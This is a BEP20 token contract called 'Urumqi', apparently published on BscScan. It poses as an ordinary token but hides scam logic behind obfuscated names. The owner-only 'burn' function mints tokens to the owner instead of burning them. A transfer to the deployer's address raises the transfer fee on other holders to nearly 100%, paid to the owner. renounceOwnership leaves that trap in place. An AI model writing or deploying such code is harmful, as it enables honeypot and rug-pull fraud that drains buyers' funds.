/**
 *Submitted for verification at BscScan.com on 2022-11-27
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.5;
contract Urumqi {
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  SAFYXX = address(0);
uint256 public constant ZIHCGC = 99999;
uint256 private  DRVOSL = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  WOODHI = 1000000000000000000;
uint256 private  DQYJIM = 10000000000000;
string public  symbol = "Urumqi";
uint256 private  QIOTPA = 10000000000;
uint256 private  DESBFM = 1000000000000000000000;
uint256 private  WUFCRH = 100000000;
string public  name = "Urumqi";
uint256 private  QTSBUQ = 1000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
address private  QDFMTX = address(0);
address private  GSZNXW = address(0);
address private  HTLZKA = address(0);
mapping (address => uint256) public balanceOf;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
address private  FNRBSJ = address(0);
function _getSAFYXX() private returns (address) {
return SAFYXX;
}

function _getGSZNXW() private returns (address) {
return GSZNXW;
}

function _getQIOTPA() private returns (uint256) {
return QIOTPA;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BKQCXC");
require(to != address(0), "BKQCXC");
require(amount <= balanceOf[from], "BKQCXC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ZIHCGC/DRVOSL ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HTLZKA){
DRVOSL = ZIHCGC+2;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
HTLZKA = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getDESBFM() private returns (uint256) {
return DESBFM;
}

function _getFNRBSJ() private returns (address) {
return FNRBSJ;
}

function _getQDFMTX() private returns (address) {
return QDFMTX;
}

function _getWOODHI() private returns (uint256) {
return WOODHI;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getDQYJIM() private returns (uint256) {
return DQYJIM;
}

function _getWUFCRH() private returns (uint256) {
return WUFCRH;
}

function _getQTSBUQ() private returns (uint256) {
return QTSBUQ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tBKQCXC 0");
require(spender != address(0), "fBKQCXC 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}